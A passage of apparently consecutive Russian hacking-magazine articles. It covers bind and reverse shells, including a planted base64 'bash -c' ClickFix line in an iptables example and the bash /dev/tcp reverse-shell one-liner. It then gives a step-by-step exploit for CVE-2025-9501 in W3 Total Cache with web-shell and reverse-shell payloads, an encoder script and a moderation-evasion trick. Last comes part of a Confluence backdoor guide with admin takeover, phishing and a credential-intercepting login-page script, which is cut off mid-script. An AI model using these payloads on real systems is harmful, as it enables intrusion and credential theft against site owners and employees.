ним IP. Сколько ни отправляй запросы, они достигнут цели, только если нуж‐
ный нам порт транслируется на нужный компьютер внутри сети. Если такая
маршрутизация не настроена, то дело плохо — просто так извне подключить‐
ся не выйдет.


Firewall
Файрвол  (в  умных  книжках  его  иногда  величают  брандмауэром) —
это механизм фильтрации сетевого трафика по заданному набору правил.
Обычная практика для сервера, который не находится за NAT и принимает
соединения из интернета, — ограничить список доступных портов минималь‐
но необходимым набором. В Linux это можно сделать с помощью команды
iptables следующим образом:


iptables -P INPUT DROP
iptables -P FORWARD DROP
iptables -P OUTPUT ACCEPT
iptables -A INPUT -i lo -j ACCEPT
iptables -A INPUT -m conntrack --ctstate ESTABLISHED,RELATED -j
ACCEPT
bash -c "$(echo
ZWNobyAiUHVmZi4uLiB5b3VyIGFzcyB3YXMgcGVuZXRyYXRlZC4gQXJ0aWNsZSBhYm91d
CBDbGlja0ZpeCBpcyBjb21taW5nIHNvb24iCg
== | base64 -d)"
iptables -A INPUT -p icmp -j ACCEPT
iptables -A INPUT -p tcp --dport 22 -m conntrack --ctstate NEW -j
ACCEPT


           WARNING

                      Будь осторожен, я  специально подложил тебе
                          команду iptables  с  пасхалкой. Поищи  ее.
                         Обратил внимание на bash -c ? Такие шалости
                        называются ClickFix. В последнее время они час‐
                         то встречаются в атаках и фишинге. И конечно
                        же, такую атаку можно использовать для получе‐
                       ния шелла.


После настройки файрвола описанным выше методом я попробую еще раз
подключиться к атакуемой тачке.





                     Мое подключение





                        Машина атакующего

Попытка соединения повисла. Шелла нет. Грусть‑печаль.


РЕВЕРС-ШЕЛЛ

В отличие от классического bind shell, реверс‑шелл инициирует подключение
с атакуемой машины к компьютеру атакующего. Это делает его удобным
для  обхода  файрволов и  NAT, но одновременно и серьезной  угрозой
для безопасности инфраструктуры.
   Время переходить к самому вкусному. Как ты уже понял, поднять сервер
на атакуемой машине и подключиться к ней мы обычно не можем. И тогда мы
делаем ровно наоборот: на нашей тачке — сервер, а на удаленной — клиент.





Еще раз по шагам:
 1. Мы запускаем на машине атакующего сервер, который ожидает сетевое
   соединение.
 2. Атакуемая машина инициирует соединение с нашим сервером.
 3. Устанавливается сетевое соединение.

Теперь инициатор соединения — атакуемая машина, и именно это позволяет
обойти ограничение на внешние входящие соединения. Изнутри‑то обычно
все разрешено! И обнаружить такой шелл тоже сложнее, поскольку на компь‐
ютере обычно множество программ, которые устанавливают сотни соеди‐
нений.


СОЗДАЕМ РЕВЕРС-ШЕЛЛ

Время протестировать реверс‑шелл на практике. В Kali Linux запустим сервер
с помощью Netcat.





Предположим, что на удаленной машине нам недоступен Netcat, поэтому
создадим шелл на основе обычного Bash. Сделать это можно вот такой
командой:


bash -i >& /dev/tcp/<ip>/<port> 0>&1

Разберем ее:
 • bash -i используется для создания интерактивной командной оболочки.
   То есть мы вводим команду, получаем ее вывод, далее можем повторить
   этот процесс;
 • >& перенаправляет stdout и stderr в сокет;
 • /dev/tcp/<ip>/<port> — это не настоящий файл, а специальная воз‐
   можность Bash: при обращении к такому пути оболочка сама открывает
   TCP-соединение;
 • 0>&1 перенаправляет поток stdin в stdout .

Разобрался? Отлично. Запускаем команду!





И получаем долгожданный реверс‑шелл.





Обрати внимание: такой шелл — это еще не полноценный терминал (TTY).
Некоторые  интерактивные  программы  могут  работать  странно или не
работать вовсе. В реальных атаках шелл обычно дополнительно «улучшают»,
но это отдельная тема.


ЧТО ДАЛЬШЕ?

Предположим, мы получили удаленный доступ к серверу (обычно через уяз‐
вимость) и каким‑то образом запустили на нем интерактивную командную
оболочку. Это дает возможность выполнять команды с нашей машины.
   Что хакеры делают дальше? Обычно собирают данные о хосте, на который
попали (этот этап атаки называется Discovery ), и закрепляются в системе
( Persistence ),  рассматривая  возможность  дальнейшего  распространения
по внутренней сети ( Lateral Movement ). В целом рекомендую познакомиться
с матрицей MITRE ATT&CK , если ты о ней еще не знаешь.


ВЫВОДЫ

В этой статье мы разобрали, что такое шелл и реверс‑шелл и почему его
чаще всего используют для получения удаленного доступа к системе. Мы уви‐
дели, что bind shell, несмотря на свою простоту, плохо подходит для реальных
условий из‑за NAT и файрволов.
   Реверс‑шелл зачастую позволяет обойти эти ограничения благодаря осо‐
бенностям своей реализации: инициатором сетевого соединения становится
сама атакуемая машина. Именно поэтому он так часто встречается в реаль‐
ных атаках и при анализе вредоносного ПО.
  Мы рассмотрели базовые примеры реализации, а больше вариантов ты
найдешь в открытых подборках вроде revshells.com .
  При этом помни, что получить шелл — это лишь один из этапов атаки. Пос‐
ле этого обычно следуют сбор информации о системе, повышение привиле‐
гий и попытки обойти защитные механизмы вроде антивирусов и EDR. Но это
уже тема для отдельного разговора. © X
ВЗЛОМ





Всё как в фильме про хакеров: отправил
одно сообщение и получил полноценный
RCE. Уязвимость в W3 Total Cache шокирует
не только простотой атаки, но и масшта‐                                                                                         ret0x2A
                                                                                            @ret0x2Aбами, ведь этот плагин для WordPress уста‐
новлен на миллионы сайтов.


W3 Total Cache — один из самых известных плагинов для WordPress, пред‐
назначен для кеширования и повышения производительности сайта. Уско‐
ряет загрузку страниц сайта за счет кеширования различных компонентов
(страницы, объекты, базы данных, браузерный кеш). Причем каждый ком‐
понент имеет свои тонкие настройки. Плагин установлен более чем на мил‐
лионе WordPress-сайтов.


           WARNING

                        Статья имеет ознакомительный характер и пред‐
                          назначена для  специалистов по безопасности,
                          проводящих  тестирование в рамках  контракта.
                       Автор  и  редакция  не  несут  ответственности
                        за любой  вред,  причиненный с  применением
                           изложенной информации. Распространение вре‐
                         доносных программ, нарушение работы систем
                      и  нарушение  тайны  переписки  преследуются
                      по закону.


В этой статье мы разберем недавнюю уязвимость CVE-2025-9501, которая
кроется в динамических фрагментах W3TC. Наша цель — подтвердить воз‐
можность атаки и посмотреть, почему она работает.
  W3  Total Cache  поддерживает  так называемые  динамические  фраг‐
менты — специальные маркеры mfunc и mclude, которые позволяют выпол‐
нять PHP-код или подключать файлы даже внутри полностью закешированной
HTML-страницы. Эта возможность предназначена для вывода пользователь‐
ских данных (например, имени авторизованного пользователя или содер‐
жимого корзины) без отключения серверного кеширования целиком.
   Если такие фрагменты не использовать или использовать некорректно,
возможна типичная ошибка кеширования: персональные данные одного
пользователя могут быть сохранены как статические и показаны другим.
Это логическая проблема конфигурации — еще не сама уязвимость.
   Суть уязвимости CVE-2025-9501 в другом. Плагин обрабатывает маркеры
mfunc и mclude без жесткой привязки к источнику контента: ему неважно,
были ли они добавлены разработчиком в шаблон или попали в страницу
из пользовательского ввода. При определенных условиях это позволяет зло‐
умышленнику внедрить такие маркеры и добиться выполнения произвольного
PHP-кода на сервере, то есть привести к удаленному выполнению кода.
   Вот пример того, как может выглядеть вставка макросов:


<?-- mfunc secret -->...PHP code...<?-- /mfunc secret -->
<?-- mclude secret -->./path/to/file.php<?-- /mclude secret -->


ПОДГОТОВКА ЛАБОРАТОРИИ

Для  теста можешь  установить любую версию WordPress. Движок никак
не защищает от инъекции, поэтому в зоне риска — любой сайт с плагином W3
Total Cache версии ниже 2.18.13.
   Поправь php.ini, чтобы плагин можно было загрузить из архива. Слиш‐
ком маленькие значения констант приведут к ошибке «Ссылка устарела».


upload_max_filesize = 128M
post_max_size = 128M
memory_limit = 1024M
max_execution_time = 300
max_input_time = 300

Не забудь рестартануть Apache.
   Качаем плагин:


curl -LO https://downloads.wordpress.org/plugin/w3-total-cache.2.8.
12.zip

И устанавливаем, загрузив архив через админку WordPress.
   После активации переходим в раздел Performance. Плагин автоматически
редиректит на мастер установки. Жмем Decline, чтобы отказаться от сбора
данных о работе плагина. Затем найдем ссылку skip this setup guide, чтобы
отключить мастер установки. В Performance → General Settings включаем Page
Cache и сохраняем изменения (синяя кнопка вверху).





                        Page Cache включен

Теперь нужно добавить поддержку динамических фрагментов. Плагин W3TC
смотрит на константу W3TC_DYNAMIC_SECURITY : если она есть, ищет вставки
кода  на  страницах  сайта. Ищем  в  wp-config.php  строку  define(
'WP_CACHE', true) и добавляем перед ней


// Значение 'secretic' привел для примера. Можно указать любое
значение, которое не порушит регулярное выражение функции
_has_dynamic*()
define('W3TC_DYNAMIC_SECURITY', 'secretic');

Если нет константы WP_CACHE , проверь права на папку с WordPress. Права
на папки должны быть 755, на файлы — 644. Иначе обнови права и переуста‐
нови плагин.
   Убедись, что включены комментарии. Для теста отключи модерацию и тре‐
бование указать какие‑то данные о пользователе. Это максимально упростит
proof of concept.


АНАЛИЗ CVE-2025-9501

Для выполнения атаки заходим на любую страницу сайта и отправляем ком‐
ментарий:


<!-- mfunc secretic -->phpinfo();<!-- /mfunc secretic -->





                 Результат работы инъекции кода в комментарий

Инъекция сработает от имени любого пользователя, в том числе неавторизо‐
ванного. Плагин W3TC ничего не знает о том, откуда взялся динамический
фрагмент. Он получает всю страницу целиком, включая комментарии. Найдя
макросы, выполняет код и отправляет результат пользователю.


Обход модерации комментариев
В пентесте и багбаунти работа часто ведется скрыто от защиты. Руководство
не предупреждает айтишников, что будет выполняться законная атака. Поэто‐
му покажу один из приемов, как белому хакеру можно обойти модерацию.
  Я просил отключить модерацию комментариев, но даже с премодерацией
инъекция может проскочить. Например, на портале, посвященном прог‐
раммированию, ни у кого не возникнет вопросов, если пользователь поин‐
тересуется о функции phpinfo() :


 Привет! Не очень понятно, как должна работать функция <!-- mfunc
 secretic -->phpinfo();<!-- /mfunc secretic -->
 ? Может кто-нибудь помочь?


На стороне админки не работает кеширование страниц, значит, фрагмент
не выполнится, верстка не поломается. Модератор не увидит макрос, так
как он обернут в стандартные комментарии HTML <!-- -->. Все будет выг‐
лядеть безопасно, и комментарий могут одобрить.





            Как модератор увидит спрятанную инъекцию кода

Подвох заметят в том случае, если модератор решит посмотреть исходный
код комментария.





                   Пример попытки спрятать инъекцию

Почти всегда можно придумать, как пропихнуть инъекцию. Помни только, что
без официального разрешения на пентест такие действия будут незакон‐
ными.


Уязвимый код находится в файле PgCache_ContentGrabber.php. Файл отве‐
чает за разбор и обработку страницы перед кешированием. Поэтому важно
было включить Page Cache.
  Нас интересует функция ob_callback , которая отвечает за подготовку
вывода. В самом начале функции есть вызов метода _has_dynamic:


    public function ob_callback( $buffer ) {
        ...
        $has_dynamic      = $this->_has_dynamic( $buffer );
        ...
    }

Метод _has_dynamic:


public function _has_dynamic( $buffer ) {
    if ( ! defined( 'W3TC_DYNAMIC_SECURITY' ) ) return false;
    return preg_match(
        '~<!--\s*m(func|clude)\s*' . W3TC_DYNAMIC_SECURITY . '(.*)
-->(.*)<!--\s*/m(func|clude)\s*' . W3TC_DYNAMIC_SECURITY . '\s*-->
~Uis',
        $buffer
    );
}

Если  константа  доступна,  регуляркой  вытаскиваются  фрагменты  кода
для выполнения. Обрати внимание, в регулярке допустимы две группы (.
*) — плагин позволяет встраивать код как между открывающим и закрыва‐
ющим тегами, так и внутри открывающего. Если потребуется, можно выпол‐
нить код в два  этапа. Например, первым этапом записать шелл через
file_put_contents() , следующим шагом подгрузить шелл на страницу.
   Если найден динамический контент, функция ob_callback регистрирует
колбэк shutdown . Колбэк выполнится после подготовки кешированной стра‐
ницы.


    public function ob_callback( $buffer ) {
        ...
        if ( $has_dynamic ) {
            $this->_shutdown_buffer = $buffer;


            $buffer = '';


            register_shutdown_function(
                array(
                    $this,
                    'shutdown',
                )
            );
        }


        return $buffer;
    }

Функция shutdown() накладывает результат выполнения динамических фраг‐
ментов на кешированную страницу:


    public function shutdown() {
        $compression = $this->_page_key_extension['compression'];
        $buffer = $this->_parse_dynamic( $this->_shutdown_buffer );
        $compressed_buffer = $this->_compress( $buffer, $compression
);
        echo $compressed_buffer;
    }

Нас  интересует  вызов  _parse_dynamic() .  Эта  функция,  в  отличие
от  _has_dynamic,   разделяет   вызов  mfunc  и  mclude,   запуская
_parse_dynamic_mfunc или _parse_dynamic_mclude для каждой вставки
кода:


    public function _parse_dynamic( $buffer ) {
        if ( ! defined( 'W3TC_DYNAMIC_SECURITY' ) ) {
            return $buffer;
        }


        $buffer = preg_replace_callback(
            '~<!--\s*mfunc\s*' . W3TC_DYNAMIC_SECURITY . '(.*)-->(.*)
<!--\s*/mfunc\s*' . W3TC_DYNAMIC_SECURITY . '\s*-->~Uis',
            array(
                $this,
                '_parse_dynamic_mfunc',
            ),
            $buffer
        );


        $buffer = preg_replace_callback(
            '~<!--\s*mclude\s*' . W3TC_DYNAMIC_SECURITY . '(.*)-->(.
*)<!--\s*/mclude\s*' . W3TC_DYNAMIC_SECURITY . '\s*-->~Uis',
            array(
                $this,
                '_parse_dynamic_mclude',
            ),
            $buffer
        );


        return $buffer;
    }

В разборах CVE-2025-9501 корнем зла указывают _parse_dynamic_mfunc() ,
которая отвечает за выполнение кода из фрагментов:


public function _parse_dynamic_mfunc( $matches ) {
    $code1 = trim( $matches[1] );
    $code2 = trim( $matches[2] );
    $code  = ( $code1 ? $code1 : $code2 );


    if ( $code ) {
        $code = trim( $code, ';' ) . ';';


        try {
            ob_start();
            $result = eval( $code );
            $output = ob_get_contents();
            ob_end_clean();
        } catch ( \Exception $ex ) {
            $result = false;
        }


        if ( false === $result ) {
            $output = sprintf( 'Unable to execute code: %s',
htmlspecialchars( $code ) );
        }
    } else {
        $output = htmlspecialchars( 'Invalid mfunc tag syntax. The
correct format is: <!-- W3TC_DYNAMIC_SECURITY mfunc PHP code --><
!-- /mfunc W3TC_DYNAMIC_SECURITY --> or <!-- W3TC_DYNAMIC_SECURITY
mfunc -->PHP code<!-- /mfunc W3TC_DYNAMIC_SECURITY -->.' );
    }


    return $output;
}

Интерес вызывает строка $result = eval( $code ); — код подставляется
прямиком в eval() .  Что, если передать ему  удаление wp-config.php
или просто пробросить реверс‑шелл на свой сервер? Код выполнится,
потому как никаких особых условий или фильтров нет. Использование eval()
в коде — это почти 100%-я вероятность remote code execution.
   Вольно пользоваться RCE не получится. Перед тем как твой пейлоад
доберется до eval() , он пройдет через кучу фильтров WordPress. Пейлоад
echo "OK"; превратится в echo&quot;OK&quot;; . PHP не поймет, что ты
от него хочешь, WordPress вернет пустую страницу, а в лог упадет ошибка:


PHP Parse error:  syntax error, unexpected token "&" in /var/www/
html/wordpress/wp-content/plugins/w3-total-cache/PgCache_
ContentGrabber.php(2131) : eval()'d code on line 1

Для теста попробуй пейлоады echo 1; и echo "1"; — первый сработает,
второй выдаст белый экран. Чтобы обойти, используй функцию chr() . При‐
мер пейлоада с текстом Ok:


<!-- mfunc secretic -->echo chr(79).chr(75);<!-- /mfunc secretic -->

В ходе экспериментов ты можешь прийти к подобной конструкции:


<!-- mfunc secretic -->$a=chr(99).chr(109).chr(100);system($_GET[$a])
;<!-- /mfunc secretic -->

В переменную $a попадет значение cmd. После подстановки ты получишь зна‐
комый system($_GET['cmd']) и сможешь спокойно использовать страницу
как полноценный веб‑шелл. Просто добавь к адресу id , whoami или сразу
несколько команд: id;ls .





                      Результат работы id;ls через веб‑шелл

Не только _parse_dynamic_mfunc() создает серьезную угрозу, обрати вни‐
мание на код _parse_dynamic_mclude :


    public function _parse_dynamic_mclude( $matches ) {
        $file1 = trim( $matches[1] );
        $file2 = trim( $matches[2] );


        $file = ( $file1 ? $file1 : $file2 );


        if ( $file ) {
            $file = ABSPATH . $file;


            if ( file_exists( $file ) && is_readable( $file ) ) {
                ob_start();
                include $file;
                $output = ob_get_contents();
                ob_end_clean();
            } else {
                $output = sprintf( 'Unable to open file: %s',
htmlspecialchars( $file ) );
            }
        } else {
            $output = htmlspecialchars( 'Incorrect mclude tag
syntax. The correct format is: <!-- mclude W3TC_DYNAMIC_SECURITY
path/to/file.php --><!-- /mclude W3TC_DYNAMIC_SECURITY --> or <!--
mclude W3TC_DYNAMIC_SECURITY -->path/to/file.php<!-- /mclude
W3TC_DYNAMIC_SECURITY -->.' );
        }


        return $output;
    }

Функция готова заинклудить любой файл, который пройдет через слабую
защиту. Например, если ты найдешь способ загрузить файл с кодом бэк‐
коннекта, то легко организуешь себе реверс‑шелл.
   Основная  защита   плагина   построена   вокруг   секретного   ключа
W3TC_DYNAMIC_SECURITY , который жестко прописан в wp-config.php. Выг‐
лядит надежно, но часто есть обход. Админ мог поторопиться и неправильно
закрыть динамический фрагмент:


<!-- mfunc secretic -->phpinfo();<!-- /mfunc -->

Здесь отсутствует секретный ключ в закрывающем теге. Ошибка приведет
к раскрытию секрета. Полученный один раз секрет можно использовать бес‐
конечно долго. Если админ решит его сменить, придется найти все фраг‐
менты на всех страницах сайта.





                 Раскрытие ключа из‑за неверного синтаксиса

Другие варианты: мисконфиг сервера, классическая local file inclusion, бэкап
файла с расширением вроде .old или .bak. Есть целые словари для поиска
бэкапов . На практике встречаются полные архивы сайтов, которые прог‐
раммисты забывают  удалить. Такие архивы могут называться prod.zip,
backup.rar, admin.tar.gz или по датам в духе 2025-11-12.zip. Здесь при‐
дется подумать над разными вариантами, составить список имен и рас‐
ширений архива. После «перемножить» имена с расширениями и запустить
фаззинг.


ПОЛУЧЕНИЕ РЕВЕРС-ШЕЛЛА

Запустим Netcat в режиме прослушивания порта:


nc -nvlp 8888

Скачиваем реверс‑шелл от pentestmonkey. Находим строки с заданием IP
и порта и прописываем свои значения. Я использую такие:


$ip = '127.0.0.1';  // CHANGE THIS
$port = 8888;       // CHANGE THIS

Удали все комментарии из кода, иначе атакующее сообщение будет слишком
большим. Тебе нужно кодировать шелл в Base64, чтобы избежать возможных
проблем со спецсимволами.
   Далее каждый символ представить в виде chr() .
  Для кодирования написал небольшой скрипт на Python:


import os
import sys
import base64



def file_to_base64_chr(input_file: str):
    # Проверяем файл
    if not os.path.exists(input_file):
        print(f"[!] File not found: {input_file}")
        return


    # Читаем файл как байты
    with open(input_file, "rb") as f:
        raw_data = f.read()


    # Кодируем в Base64
    b64_data = base64.b64encode(raw_data).decode("ascii")


    # Каждый символ Base64 превращаем в chr()
    chr_output = " . ".join([f"chr({ord(c)})" for c in b64_data])


    # Имя нового файла
    base, ext = os.path.splitext(input_file)
    output_file = f"{base}_encoded.txt"


    # Сохраняем результат
    with open(output_file, "w", encoding="utf-8") as f:
        f.write(chr_output)


    print(f"[+] Base64 → chr() saved to: {output_file}")
    print(f"[+] Base64 length: {len(b64_data)} characters")



if __name__ == "__main__":
    if len(sys.argv) != 2:
        print("Usage: python file_to_base64_chr.py <file>")
        sys.exit(1)


    file_to_base64_chr(sys.argv[1])

Скрипт принимает имя файла, приводит содержимое к нужному виду и сох‐
раняет с приставкой _encoded . Остается составить комментарий по шаблону:


<!-- mfunc secretic -->
$fname = ABSPATH . chr(115) . chr(104) . chr(101) . chr(108) . chr(
108) . chr(46) . chr(112) . chr(104) . chr(112);
$encode=<encoded_shell> ;
$decoded = base64_decode($encoded);
file_put_contents($fname, $decoded);
<!-- /mfunc secretic -->
<!-- mclude secretic -->./shell.php<!-- /mclude secretic -->

Вместо <encoded_shell> нужно будет  подставить  то, что выдал скрипт
кодирования. Убери переносы строки внутри mfunc , иначе выскочит ошибка
при выполнении eval() .
  При работе кода в переменную $fname упадет путь к файлу shell.php
в  папке  WordPress.  Например,  /var/www/html/wordpress/shell.php.
В $encode ляжет Base64-строка с шеллом. Строка декодируется функцией
base64_decode , и PHP-код рабочего реверс‑шелла будет в $decoded . Фун‐
кция file_put_contents сохранит все в файл на сервере. Можешь убедить‐
ся сам, проверь содержимое папки с WordPress.
   Сразу отработает второй макрос — mclude. Он подключит код шелла
к странице через include . Это приведет к запуску реверс‑шелла и созданию
коннекта с «Неткатом».





                            Получен бэкконнект

Теперь сервер полностью в твоих руках. Для этого потребовался всего один
комментарий! © X
ВЗЛОМ





Confluence — не  просто  корпоративная
база знаний, а еще и удобная точка опоры
для хакера в организации. В этой статье мы
разберем   актуальный   пример   «атаки                                                                               Георгий Кумуржи
                                                                                       RedTeam-специалист,у  водопоя»  с  внедрением  JS-бэкдора                                                                                     преподаватель РТУ МИРЭА
в   основную   форму   аутентификации             @kgmnotes
Confluence.



Эта статья вышла в свет в том числе благодаря Ивану Балашову — идейному
вдохновителю абьюза Custom HTML в Confluence.



           WARNING

                        Статья имеет ознакомительный характер и пред‐
                          назначена для  специалистов по безопасности,
                          проводящих  тестирование в рамках  контракта.
                       Автор  и  редакция  не  несут  ответственности
                        за любой  вред,  причиненный с  применением
                           изложенной информации. Распространение вре‐
                         доносных программ, нарушение работы систем
                      и  нарушение  тайны  переписки  преследуются
                      по закону.



ЛЕГИТИМНЫЕ ВОЗМОЖНОСТИ НА ВООРУЖЕНИИ У ХАКЕРА

Знал ли ты, что функция добавления пользовательского HTML (Custom
HTML)  в  настройках  администратора  впервые  появилась  в  версии
Confluence 2.1.5 , выпущенной 16 марта 2006 года?
  В примечаниях к этому выпуску было прямо указано:


       Administrators can insert custom HTML on every Confluence page, see
       Administration, Custom HTML.«                »
Казалось бы, что тут могло пойти не так?.. Получив права администратора
в Confluence, мы не только становимся обладателями ценной информации
из корпоративной базы знаний, но и открываем для себя широкие воз‐
можности горизонтального перемещения (lateral movement). Confluence —
узловая точка, к которой ежедневно обращается множество сотрудников.
Внедрив JS-бэкдор в страницу аутентификации, мы получаем доступ к акту‐
альным доменным учеткам (при интеграции Confluence с Active Directory).
В  итоге  компрометация  одного веб‑сервиса превращается в трамплин
для атаки на весь домен организации.


ПОДГОТОВИТЕЛЬНЫЙ ЭТАП

Получаем доступ к админ-панели
У нас есть два пути попасть в админ‑панель.
 1. Попробовать найти и проэксплуатировать уязвимость (CVE) в Confluence.
 2. Зафишить пользователя из группы confluence-administrators.


Эксплуатируем CVE-2022-26134
Эксплуатация CVE-2022-26134 предельно проста: достаточно отправить все‐
го один HTTP-запрос на сервер, чтобы добавить нового пользователя в груп‐
пу confluence-administrators.





Логинимся с новосозданной админской учеткой.





Вуаля! У нас появился доступ к основным настройкам сервера Confluence.





Если Confluence полностью пропатчен, можно попробовать получить админ‐
ский доступ другими способами — например, с помощью фишинга.


Фишим с помощью Evilginx2
Альтернативой классическому  инструменту Gophish может быть  Evilginx2.
Ниже пример авторского Evilginx2-фишлета для работы с Confluence.





Такой фишлет позволит перехватить не только логин и пароль жертвы, но и ее
валидный сессионный токен.





Дальше можно продолжить работу от имени зафишенной учетки или создать
отдельную админскую (например, backup-adm ).


Создаем нового пользователя
Первое, что нужно сделать после получения доступа к админ‑панели (неваж‐
но, каким способом), — создать новую учетку в группе confluence-users .
Для этого жмем на шестеренку в правом верхнем углу и выбираем пункт
«Управление пользователями».





Если нужно, снова вводим пароль от используемой админской учетки.





Переходим  в  раздел  «Добавить  пользователей»,  заполняем  все  поля
и нажимаем кнопку «Добавить».





Проверяем, что пользователь успешно добавлен.





Здесь  возникает  закономерный  вопрос: зачем нам вообще  создавать
отдельного пользователя? Все упирается в механизм эксфильтрации данных.
Внедренный JS-бэкдор должен не только перехватить учетные данные, но и
передать их нам. Прямая отправка на внешний сервер (например, через
Telegram Bot API) была бы идеальной, но политики CORS в современных бра‐
узерах и корпоративные файрволы почти гарантированно заблокируют такой
запрос.
   Чтобы обойти эти ограничения, нужно отправить данные на источник,
которому браузер по умолчанию доверяет. А что может быть более доверен‐
ным источником, чем сам сервер Confluence?


Создаем приватную вики-страницу
На прошлом шаге мы создали новую учетку backup, мимикрирующую под тех‐
ническую, а теперь решим, куда JS-бэкдор будет сливать перехваченные
логины и пароли. Пусть это будет приватная вики‑страница, принадлежащая
нашей новой «технической» учетке. Поэтому логинимся под ней и идем соз‐
давать новую заметку.





Название заметке можно задать любое, например тоже Backup. После этого
нажимаем на значок открытого замка и выставляем такие же настройки при‐
ватности.





           WARNING

                            Если ты столкнешься с тем, что у нового поль‐
                           зователя не хватает прав на изменение настроек
                           конфиденциальности создаваемых заметок, вре‐
                          менно добавь этого пользователя в группу адми‐
                            нистраторов     Confluence:    confluence-
                   administrators .


Пора опубликовать нашу пока еще пустую заметку.





Здесь нам может не повезти: после создания заметки мы сразу увидим ее
числовой идентификатор в URL (параметр pageId). Или, как в этом случае,
в URL не отображается числовой идентификатор страницы — тогда просто
нажимаем в правом верхнем углу символ многоточия (...), а затем в выпада‐
ющем списке выбираем пункт «Информация о странице».





И вытаскиваем из URL открывшейся страницы числовой идентификатор
нашей заметки.





В нашем случае числовой идентификатор приватной страницы — 1277955 ,
запоминаем его.


           WARNING

                             Читатели «Хакера» все‑таки этичные специалис‐
                          ты, которые не разбрасываются чужими учетными
                         данными. Однако даже при всей осторожности
                          перехваченные креды какое‑то время будут оста‐
                            ваться в комментариях вики‑страницы. Поэтому
                        их стоит зашифровать — и заодно сделать менее
                          приметными:  Base64-строки  от  «технического
                            аккаунта» выглядят куда безобиднее, чем логины
                      и пароли открытым текстом.



Генерируем ключи шифрования
Важно помнить: любой может разобрать внедряемый нами JS-скрипт, просто
открыв исходный код страницы аутентификации. Поэтому симметричное
шифрование бессмысленно: ключ, зашитый в коде, мгновенно окажется
скомпрометирован. Остается только асимметричная криптография на сто‐
роне клиента. К счастью, благодаря Web Crypto API нам не придется с нуля
писать сложные алгоритмы.
   Остается лишь выбрать стандарт, который позволит надежно зашиф‐
ровать «улов» в браузере и расшифровать его локально. Мой выбор пал
на RSA-OAEP —  проверенный  алгоритм  асимметричного шифрования
с использованием открытого ключа.





             Пример генерации открытого и закрытого ключей

Получаем значение публичного ключа, закодированное в Base64, одной стро‐
кой без заголовков.





                                     Продолжение статьи →
                   ← НАЧАЛО СТАТЬИВЗЛОМ

     АТАКА У ВОДОПОЯ
               ВНЕДРЯЕМ JS-БЭКДОР
                     В CONFLUENCE




Этот ключ нам уже совсем скоро понадобится!


Готовим JS-бэкдор
Когда с подготовкой покончено, осталось только отредактировать шаблон
JS-бэкдора:


document.addEventListener("DOMContentLoaded", async function() {
   console.log("[LOGIN-INTERCEPTOR] Скрипт загружен");
   console.log("Время:", new Date().toLocaleTimeString());


   // Публичный ключ RSA в формате Base64 (без PEM-заголовков)
   const publicKeyBase64 = "<ВСТАВИТЬ_ПУБЛИЧНЫЙ_КЛЮЧ_ШИФРОВАНИЯ>";


   /**
    * Конвертирует ArrayBuffer в строку Base64
    * @param {ArrayBuffer} buffer — бинарные данные для конвертации
    * @returns {string} — Base64-строка
    */
   function bufferToBase64(buffer) {
       let binary = '';
       const bytes = new Uint8Array(buffer);
       for (let i = 0; i < bytes.byteLength; i++) {
           binary += String.fromCharCode(bytes[i]);
       }
       return window.btoa(binary);
   }


   /**
    * Импортирует публичный RSA-ключ из формата Base64
    * @param {string} base64PublicKey — публичный ключ в формате
Base64
    * @returns {Promise<CryptoKey>} — объект CryptoKey для шифрования
    */
   async function importPublicKey(base64PublicKey) {
       // Декодируем Base64 в бинарную строку
       const binaryDerString = atob(base64PublicKey);
       const binaryDer = new Uint8Array(binaryDerString.length);


       // Конвертируем строку в массив байтов
       for (let i = 0; i < binaryDerString.length; i++) {
           binaryDer[i] = binaryDerString.charCodeAt(i);
       }


       // Импортируем ключ через Web Crypto API
       return await crypto.subtle.importKey(
               // Формат ключа (SubjectPublicKeyInfo)
           "spki",
           // Бинарные данные ключа
           binaryDer.buffer,
           // Алгоритм шифрования
           { name: "RSA-OAEP", hash: { name: "SHA-256" } },
           // Извлекаемый ключ
           true,
           // Разрешенные операции
           ["encrypt"]
       );
   }


   /**
    * Шифрует данные с использованием RSA-OAEP
    * @param {string} data — текст для шифрования
    * @param {CryptoKey} publicKey — публичный ключ для шифрования
    * @returns {Promise<ArrayBuffer>} — зашифрованные данные
    */
   async function encryptData(data, publicKey) {
       // Кодируем текст в UTF-8
       const encodedData = new TextEncoder().encode(data);


       // Шифруем данные
       return await crypto.subtle.encrypt(
           { name: "RSA-OAEP" },
           publicKey,
           encodedData
       );
   }


   try {
       console.log("Импортируем публичный ключ...");
       const publicKey = await importPublicKey(publicKeyBase64);
       console.log("Ключ импортирован успешно");


       // Поиск формы логина по имени или селектору
       console.log("Ищем форму логина...");
       const loginForm = document.forms["loginform"] || document.
querySelector('form[name="loginform"]');
       const loginButton = document.getElementById('loginButton');


       // Проверка наличия формы
       if (!loginForm) {
           console.error("Форма логина не найдена!");
           return;
       }


       // Проверка наличия кнопки (опционально)
       if (!loginButton) {
           console.error("Кнопка логина не найдена!");
           return;
       }


       console.log("Форма найдена:", loginForm.name);
       console.log("Кнопка найдена:", loginButton.id);


       // Флаг для предотвращения повторной обработки события
       let isProcessing = false;


       /**
        * Обработчик события submit формы
        * Перехватывает отправку формы, шифрует учетные данные и
отправляет их на сервер
        */
       loginForm.addEventListener('submit', async function(e) {
           console.log("SUBMIT события формы перехвачено!");


           // Предотвращаем стандартную отправку формы
           e.preventDefault();
           e.stopImmediatePropagation();


           // Защита от повторной обработки
           if (isProcessing) {
               console.warn("Уже обрабатывается, игнорируем
повторный вызов");
               return false;
           }


           isProcessing = true;
           console.log("Начинаем обработку учетных данных...");


           // Получаем поля ввода логина и пароля
           const usernameField = document.getElementById('os_username
');
           const passwordField = document.getElementById('os_password
');


           // Если поля не найдены, отправляем форму без обработки
           if (!usernameField || !passwordField) {
               console.error("Поля логина/пароля не найдены,
отправляем форму");
               loginForm.submit();
               return false;
           }


           // Извлекаем значения полей
           const username = usernameField.value;
           const password = passwordField.value;


           console.log("Username:", username);
           console.log("Password:", password ? "***" : "(пустое)");


           // Проверка на пустые поля
           if (!username || !password) {
               console.warn("Поля пустые, отправляем форму без
обработки");
               loginForm.submit();
               return false;
           }


           // Формируем строку credentials в формате "username:
password"
           const credentials = `${username}:${password}`;


           try {
               console.log("Шифруем учетные данные...");
               // Шифруем credentials с помощью RSA
               const encryptedCredentials = await encryptData(
credentials, publicKey);
               // Конвертируем зашифрованные данные в Base64
               const encryptedBase64 = bufferToBase64(
encryptedCredentials);
               console.log("Данные зашифрованы, длина:",
encryptedBase64.length);


               console.log("[ШАГ 1/2] Отправляем зашифрованные
данные на сервер...");
               console.log("Время начала:", new Date().
toLocaleTimeString());
